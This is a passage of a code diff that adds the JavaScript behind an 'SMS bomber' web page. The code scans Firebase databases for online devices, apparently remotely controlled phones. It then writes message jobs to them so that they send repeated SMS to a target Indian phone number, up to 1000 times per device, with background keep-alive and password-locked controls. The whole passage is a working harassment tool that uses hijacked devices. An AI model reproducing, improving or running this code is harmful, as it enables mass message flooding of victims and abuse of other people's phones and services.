+        fb.onlineIds.forEach(function(id){ out.push({url:fb.url, root:fb.root, id:id, fbShort:fbShort}); });
+    });
+    return out;
+}
+
+function sortFirebases(){
+    state.firebases.sort(function(a,b){
+        var aDead = (a.status==='error') || (a.online||0)===0;
+        var bDead = (b.status==='error') || (b.online||0)===0;
+        if(aDead !== bDead) return aDead ? 1 : -1;
+        if((b.online||0) !== (a.online||0)) return (b.online||0) - (a.online||0);
+        return (b.total||0) - (a.total||0);
+    });
+    state.firebases.forEach(function(fb, i){ fb.rank = i + 1; });
+}
+
+function renderStats(){
+    var fbs = state.firebases.length;
+    var working = state.firebases.filter(function(f){return f.status==='done' && f.online>0;}).length;
+    var t=0,o=0,f=0;
+    state.firebases.forEach(function(fb){ t+=fb.total||0; o+=fb.online||0; f+=fb.offline||0; });
+    els.sFB.textContent = working + '/' + fbs;
+    els.sTotal.textContent = t;
+    els.sOnline.textContent = o;
+    els.sOffline.textContent = f;
+    var done = state.firebases.filter(function(f){return f.status!=='loading' && f.status!=='idle';}).length;
+    els.scanStatus.textContent = state.scanning ? (done+'/'+fbs+' scanning') : (working+' live');
+}
+
+function renderFBList(){
+    var html = '';
+    state.firebases.forEach(function(fb){
+        var cls = 'fbcard';
+        if(fb.status==='error' || (fb.status==='done' && (fb.online||0)===0)) cls += ' dead';
+        else if(fb.rank === 1) cls += ' top';
+        if(fb.custom) cls += ' custom';
+        if(state.revealed) cls += ' revealed';
+        html += '<div class="'+cls+'" data-url="'+esc(fb.url)+'">';
+        html += '<div class="rank">#'+fb.rank+'</div>';
+        html += '<div class="info"><div class="label">'+esc(fbName(fb.url))+(fb.custom?' <span class="badge-c">CUSTOM</span>':'')+'</div><div class="u">'+esc(fb.url)+'</div></div>';
+        if(fb.status==='idle') html += '<span style="color:#333;font-size:10px;font-weight:800">ready</span>';
+        else if(fb.status==='loading') html += '<div class="spin"></div>';
+        else if(fb.status==='done') html += '<div class="nums"><div class="x o"><div class="lbl">ON</div><div class="val">'+(fb.online||0)+'</div></div><div class="x f"><div class="lbl">OFF</div><div class="val">'+(fb.offline||0)+'</div></div></div>';
+        else html += '<span style="color:#f87171;font-size:10px;font-weight:800">fail</span>';
+        if(fb.custom) html += '<button class="del" data-del="'+esc(fb.url)+'">✕</button>';
+        html += '</div>';
+    });
+    if(!html) html = '<div style="padding:20px;text-align:center;color:#333;font-size:11px">No firebases.</div>';
+    els.fbList.innerHTML = html;
+    els.fbList.querySelectorAll('[data-del]').forEach(function(b){
+        b.addEventListener('click', function(e){
+            e.stopPropagation();
+            var u = b.getAttribute('data-del');
+            if(!confirm('Delete this custom firebase?\n\n'+u)) return;
+            state.customFbs = state.customFbs.filter(function(x){ return x !== u; });
+            saveCustomFbs(state.customFbs);
+            initFirebases();
+            renderAll();
+            toast('🗑 Removed');
+        });
+    });
+}
+
+function renderProg(){
+    if(state.sending){
+        els.blastProg.classList.remove('hide');
+        var pct = state.prog.total>0 ? (state.prog.done/state.prog.total*100) : 0;
+        els.progFill.style.width = pct+'%';
+        els.psOk.textContent = state.prog.sent;
+        els.psFa.textContent = state.prog.fail;
+        var remain = state.prog.total - state.prog.done;
+        els.psRm.textContent = remain;
+        var eta = state.prog.rate>0 ? remain/state.prog.rate : Infinity;
+        els.psEta.textContent = fmtTime(eta);
+        els.rateTxt.textContent = '⚡ ' + (state.prog.rate||0).toFixed(0) + ' msg/s · ALL-AT-ONCE';
+        els.progTxt.innerHTML = state.prog.done+' / '+state.prog.total+' <span class="em">processed</span>';
+        els.blastBtn.textContent = '💥 '+state.prog.done+'/'+state.prog.total;
+        els.stopBtn.style.display = 'flex';
+    } else if(state.prog.total>0){
+        els.blastProg.classList.remove('hide');
+        els.progFill.style.width = '100%';
+        els.psOk.textContent = state.prog.sent;
+        els.psFa.textContent = state.prog.fail;
+        els.psRm.textContent = 0;
+        els.psEta.textContent = 'done';
+        els.rateTxt.textContent = '───';
+        els.progTxt.innerHTML = (state.stopped?'<span class="em">stopped</span> ':'<span class="dg">complete</span> ')+state.prog.done+' devices · '+state.prog.sent+' msgs';
+        els.blastBtn.textContent = '💥 BOOM';
+        els.stopBtn.style.display = 'none';
+    } else {
+        els.blastProg.classList.add('hide');
+        els.stopBtn.style.display = 'none';
+        els.blastBtn.textContent = '💥 BOOM';
+    }
+}
+
+function updateBomber(){
+    var online = collectOnline();
+    var per = state.countValue;
+    els.onlineCnt.textContent = online.length;
+    els.totalSend.textContent = online.length * per;
+    var num = els.numInput.value;
+    var msg = els.msgInput.value.trim();
+    var ready = num.length===10 && msg.length>0 && online.length>0 && !state.sending;
+    els.blastBtn.disabled = !ready;
+    if(state.sending){ els.readyBadge.textContent = 'BLASTING'; els.readyBadge.style.background = 'rgba(239,68,68,.15)'; els.readyBadge.style.color = '#f87171'; }
+    else if(ready){ els.readyBadge.textContent = '✓ READY'; els.readyBadge.style.background = 'rgba(74,222,128,.15)'; els.readyBadge.style.color = '#4ade80'; }
+    else { els.readyBadge.textContent = 'FILL'; els.readyBadge.style.background = 'rgba(255,255,255,.05)'; els.readyBadge.style.color = '#666'; }
+}
+
+function renderLog(){
+    if(!state.blastLog.length){ els.blastLog.classList.add('hide'); els.logActions.classList.add('hide'); return; }
+    els.blastLog.classList.remove('hide');
+    els.logActions.classList.remove('hide');
+    var html='';
+    var start = Math.max(0, state.blastLog.length-250);
+    for(var i=start;i<state.blastLog.length;i++){
+        var l = state.blastLog[i];
+        if(l.type === 'hdr'){ html += '<div class="fb-hdr">▸ '+esc(l.fb)+'</div>'; }
+        else { html += '<div class="ln"><span class="t">'+l.t+'</span><span class="s '+l.s+'">'+l.icon+'</span><span class="m">'+esc(l.m)+'</span></div>'; }
+    }
+    els.blastLog.innerHTML = html;
+    els.blastLog.scrollTop = els.blastLog.scrollHeight;
+    var erCount = state.blastLog.filter(function(l){return l.s==='er';}).length;
+    els.retryBtn.disabled = erCount === 0 || state.sending;
+    els.exportBtn.disabled = state.blastLog.length === 0;
+    els.clearLogBtn.disabled = state.sending;
+}
+
+function renderAll(){ renderStats(); renderFBList(); updateBomber(); renderProg(); renderLog(); }
+
+function initFirebases(){
+    var all = FIREBASES.slice();
+    state.customFbs.forEach(function(u){
+        var n = normUrl(u);
+        if(n && all.indexOf(n) === -1) all.push(n);
+    });
+    state.firebases = all.map(function(u){
+        var clean = normUrl(u);
+        return {url:clean, host:clean.replace(/^https?:\/\//,''), status:'idle', total:0, online:0, offline:0, root:null, onlineIds:[], error:null, rank:0, custom: state.customFbs.indexOf(clean) !== -1};
+    });
+}
+
+async function scanAll(){
+    if(state.scanning) return;
+    if(state.firebases.length === 0){ els.scanStatus.textContent = 'no firebases'; renderFBList(); return; }
+    state.scanning = true;
+    state.firebases.forEach(function(fb){ fb.status='loading'; fb.total=0; fb.online=0; fb.offline=0; fb.onlineIds=[]; fb.root=null; fb.error=null; });
+    sortFirebases(); renderAll();
+    var BATCH = 12;
+    for(var i=0;i<state.firebases.length; i+=BATCH){
+        var slice = state.firebases.slice(i, i+BATCH);
+        await Promise.all(slice.map(function(fb){
+            return scanOne(fb.url).then(function(r){ fb.status='done'; fb.total=r.total; fb.online=r.online; fb.offline=r.offline; fb.root=r.root; fb.onlineIds=r.onlineIds; })
+                .catch(function(e){ fb.status='error'; fb.error=e.message||'failed'; });
+        }));
+        sortFirebases(); renderAll();
+    }
+    state.scanning = false;
+    sortFirebases(); renderAll();
+    var devs = collectOnline();
+    toast('✅ '+devs.length+' online ready');
+    vibrate([30,50,30]);
+    if(devs.length > 0) notify('Scan Complete', devs.length+' online devices');
+}
+
+els.addFbBtn.addEventListener('click', function(){
+    els.addFbModal.classList.remove('hide');
+    els.addFbInput.value = '';
+    els.addFbErr.textContent = '';
+    setTimeout(function(){ els.addFbInput.focus(); }, 100);
+});
+els.addFbCancel.addEventListener('click', function(){ els.addFbModal.classList.add('hide'); });
+els.addFbModal.addEventListener('click', function(e){ if(e.target === els.addFbModal) els.addFbModal.classList.add('hide'); });
+els.addFbOk.addEventListener('click', function(){
+    var raw = els.addFbInput.value || '';
+    var parts = raw.split(/[\s,;]+/).map(function(x){ return x.trim(); }).filter(Boolean);
+    var added = 0, skipped = 0, invalid = 0;
+    parts.forEach(function(p){
+        var n = normUrl(p);
+        if(!n){ invalid++; return; }
+        if(FIREBASES.indexOf(n) !== -1 || state.customFbs.indexOf(n) !== -1){ skipped++; return; }
+        state.customFbs.push(n);
+        added++;
+    });
+    if(added === 0){
+        els.addFbErr.textContent = invalid > 0 ? '❌ Invalid URL' : 'Already added';
+        return;
+    }
+    saveCustomFbs(state.customFbs);
+    els.addFbModal.classList.add('hide');
+    initFirebases();
+    renderAll();
+    toast('✅ Added '+added+(skipped?' · skipped '+skipped:'')+(invalid?' · invalid '+invalid:''));
+    scanAll();
+});
+els.resetFbBtn.addEventListener('click', function(){
+    if(!state.customFbs.length){ toast('No custom firebases'); return; }
+    if(!confirm('Delete all '+state.customFbs.length+' custom firebases?')) return;
+    state.customFbs = [];
+    saveCustomFbs(state.customFbs);
+    initFirebases();
+    renderAll();
+    toast('🗑 Custom cleared');
+});
+
+els.fbToggle.addEventListener('click', function(){
+    if(!state.revealed){
+        els.pwModal.classList.remove('hide'); els.pwInput.value = ''; els.pwErr.textContent = '';
+        setTimeout(function(){ els.pwInput.focus(); }, 100);
+        return;
+    }
+    els.fbToggle.classList.toggle('open'); els.fbBox.classList.toggle('open');
+});
+els.pwOk.addEventListener('click', tryUnlock);
+els.pwInput.addEventListener('keydown', function(e){ if(e.key==='Enter') tryUnlock(); });
+els.pwCancel.addEventListener('click', function(){ els.pwModal.classList.add('hide'); });
+els.pwModal.addEventListener('click', function(e){ if(e.target === els.pwModal) els.pwModal.classList.add('hide'); });
+function tryUnlock(){
+    var v = els.pwInput.value.trim();
+    if(v === UNLOCK_PASSWORD){
+        state.revealed = true;
+        els.pwModal.classList.add('hide');
+        els.fbToggle.querySelector('span').innerHTML = '<span class="lock" style="color:#4ade80">🔓</span>Firebase List · Unlocked';
+        els.fbToggle.classList.add('open'); els.fbBox.classList.add('open');
+        els.fbActions.style.display = 'flex';
+        renderFBList();
+        toast('🔓 Unlocked');
+    } else {
+        els.pwErr.textContent = '❌ Galat password';
+        els.pwInput.value = '';
+        vibrate([80,40,80]);
+    }
+}
+
+els.counterLock.addEventListener('click', function(){
+    if(state.countUnlocked){
+        var v = prompt('Repeat count (1-1000):', state.countValue);
+        if(v === null) return;
+        var n = parseInt(v);
+        if(isNaN(n) || n<1) n = 1;
+        if(n>1000) n = 1000;
+        state.countValue = n;
+        els.counterVal.textContent = n;
+        updateBomber();
+        return;
+    }
+    els.countModal.classList.remove('hide');
+    els.countPwInput.value = '';
+    els.countPwErr.textContent = '';
+    setTimeout(function(){ els.countPwInput.focus(); }, 100);
+});
+els.countPwOk.addEventListener('click', tryCountUnlock);
+els.countPwInput.addEventListener('keydown', function(e){ if(e.key==='Enter') tryCountUnlock(); });
+els.countPwCancel.addEventListener('click', function(){ els.countModal.classList.add('hide'); });
+els.countModal.addEventListener('click', function(e){ if(e.target === els.countModal) els.countModal.classList.add('hide'); });
+function tryCountUnlock(){
+    var v = els.countPwInput.value.trim();
+    if(v === UNLOCK_PASSWORD){
+        state.countUnlocked = true;
+        els.countModal.classList.add('hide');
+        els.counterLock.classList.add('unlocked');
+        toast('🔓 Count unlocked');
+        var p = prompt('Repeat count (1-1000):', state.countValue);
+        if(p !== null){
+            var n = parseInt(p);
+            if(isNaN(n) || n<1) n = 1;
+            if(n>1000) n = 1000;
+            state.countValue = n;
+            els.counterVal.textContent = n;
+            updateBomber();
+        }
+    } else {
+        els.countPwErr.textContent = '❌ Galat password';
+        els.countPwInput.value = '';
+        vibrate([80,40,80]);
+    }
+}
+
+els.numInput.addEventListener('input', function(){
+    els.numInput.value = els.numInput.value.replace(/\D/g,'').slice(0,10);
+    if(isProtected(els.numInput.value)){ showBlocked(); }
+    updateBomber();
+});
+els.msgInput.addEventListener('input', updateBomber);
+
+function pushLogEntry(entry){
+    state.blastLog.push(entry);
+    if(state.blastLog.length > 500) state.blastLog.shift();
+    renderLog();
+}
+function pushLog(s, m){
+    var icon = s==='ok' ? '✓' : s==='er' ? '✗' : s==='rt' ? '↻' : '·';
+    pushLogEntry({t:new Date().toLocaleTimeString('en-IN',{hour12:false}), s:s, icon:icon, m:m});
+}
+function pushFBHeader(fb){ pushLogEntry({type:'hdr', fb:fb}); }
+
+els.stopBtn.addEventListener('click', function(){
+    if(!state.sending) return;
+    state.stopped = true;
+    toast('⛔ Stopped');
+    vibrate([50,30,50]);
+});
+els.retryBtn.addEventListener('click', function(){ if(state.sending) return; if(!state.failedJobs.length){ toast('No failed jobs'); return; } runBlast(state.failedJobs.slice(), true); });
+els.exportBtn.addEventListener('click', function(){
+    if(!state.blastLog.length) return;
+    var txt = '';
+    state.blastLog.forEach(function(l){
+        if(l.type === 'hdr') txt += '\n=== ' + l.fb + ' ===\n';
+        else txt += '['+l.t+'] '+l.icon+' '+l.m+'\n';
+    });
+    txt += '\n--- DMRX BOMBER '+new Date().toISOString()+' ---';
+    try{ var blob = new Blob([txt], {type:'text/plain'}); var a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = 'dmrx_log_'+Date.now()+'.txt'; a.click(); setTimeout(function(){ URL.revokeObjectURL(a.href); }, 100); toast('✅ Exported'); }catch(e){ toast('Export failed'); }
+});
+els.clearLogBtn.addEventListener('click', function(){ if(state.sending) return; state.blastLog = []; state.prog = {done:0,total:0,sent:0,fail:0,startTime:0,lastRateTime:0,lastRateSent:0,rate:0}; state.failedJobs = []; renderLog(); renderProg(); });
+els.rescanBtn.addEventListener('click', function(){ if(state.sending || state.scanning) return; scanAll(); });
+
+async function sendOne(dev, payload, signal){
+    try{ await fbPut(dev.url, primaryPath(dev), payload, signal); return 1; }catch(e){ if(e.message === 'STOPPED') throw e; }
+    try{ await fbPut(dev.url, fallbackPath(dev), payload, signal); return 1; }catch(e){ if(e.message === 'STOPPED') throw e; }
+    try{ await fbPut(dev.url, thirdPath(dev), payload, signal); return 1; }catch(e){ if(e.message === 'STOPPED') throw e; }
+    return 0;
+}
+
+function runBlast(jobs, isRetry){
+    if(!jobs || !jobs.length) return;
+    var num = els.numInput.value;
+    if(num.length !== 10){ toast('10 digit number'); return; }
+    if(isProtected(num)){ showBlocked(); return; }
+    var msg = els.msgInput.value.trim();
+    if(!msg){ toast('Message daalo'); return; }
+    var phone = '+91'+num;
+
+    keepAliveStart(); wakeStart(); bgGuardOn(); bgBadgeShow(true);
+
+    state.sending = true; state.stopped = false;
+    if(!isRetry){ state.blastLog = []; state.failedJobs = []; }
+    state.prog = {done:0, total:jobs.length, sent:0, fail:0, startTime:Date.now(), lastRateTime:Date.now(), lastRateSent:0, rate:0};
+
+    pushLog('i', '🚀 ALL-AT-ONCE '+phone+' → '+jobs.length+' devices');
+    renderProg(); updateBomber();
+
+    var total = jobs.length;
+    var batchHeaders = {};
+
+    function finishOne(ok){
+        state.prog.done++;
+        if(ok) state.prog.sent++;
+        else state.prog.fail++;
+        renderProg(); updateBomber();
+    }
+
+    function fireOne(job, idx){
+        if(state.stopped) return;
+        var dev = job.dev;
+        var fromSim = (idx % 2) + 1;
+        var payload = {from:fromSim, to:phone, message:msg, isSended:false, _bcTime:Date.now()+idx};
+        var ctl = new AbortController();
+
+        sendOne(dev, payload, ctl.signal).then(function(ok){
+            if(state.stopped) return;
+            if(!batchHeaders[dev.fbShort]){
+                batchHeaders[dev.fbShort] = true;
+                pushFBHeader(dev.fbShort);
+            }
+            if(ok > 0){
+                pushLog('ok','#'+(idx+1)+' '+dev.id.slice(0,12)+'… sent');
+                finishOne(true);
+            } else {
+                pushLog('er','#'+(idx+1)+' '+dev.id.slice(0,12)+'… fail');
+                state.failedJobs.push(job);
+                finishOne(false);
+            }
+        }).catch(function(){});
+    }
+
+    for(var i=0;i<total;i++){
+        (function(j, delay){
+            setTimeout(function(){ fireOne(j, j.index); }, delay);
+        })(jobs[i], Math.floor(i/100) * 5);
+    }
+
+    var watcher = setInterval(function(){
+        if(state.stopped || state.prog.done >= total){
+            clearInterval(watcher);
+            if(!state.sending) return;
+            state.sending = false;
+            renderProg(); renderLog(); updateBomber();
+            keepAliveStop(); wakeStop(); bgGuardOff(); bgBadgeShow(false);
+            var s = state.prog.sent;
+            if(state.stopped) toast('⛔ Stopped · '+s+' msgs');
+            else { toast('✅ Done · '+s+' msgs sent'); vibrate([50,30,100]); notify('Blast Complete', s+' messages sent'); }
+        }
+    }, 250);
+}
+
+els.blastBtn.addEventListener('click', function(){
+    if(state.sending) return;
+    try{ if('Notification' in window && Notification.permission === 'default') Notification.requestPermission(); }catch(e){}
+    var num = els.numInput.value;
+    if(isProtected(num)){ showBlocked(); return; }
+    var devs = collectOnline();
+    if(devs.length===0){ toast('Koi online device nahi'); return; }
+    var per = state.countValue;
+    var jobs = [];
+    for(var i=0;i<per;i++) devs.forEach(function(d){ jobs.push({dev:d, index:i}); });
+    runBlast(jobs, false);
+});
+
+window.addEventListener('visibilitychange', function(){ if(state.sending) keepAliveStart(); });
+
+setInterval(function(){
+    if(!state.sending) return;
+    var now = Date.now();
+    var dt = (now - state.prog.lastRateTime)/1000;
+    if(dt >= 0.4){
+        var ds = state.prog.done - state.prog.lastRateSent;
+        state.prog.rate = ds/dt;
+        state.prog.lastRateTime = now;
+        state.prog.lastRateSent = state.prog.done;
+        renderProg();
+    }
+}, 400);
+
+state.customFbs = loadCustomFbs();
+initFirebases();
+renderAll();
+setTimeout(scanAll, 300);
+
+})();
+</script>
+</body>
+</html>
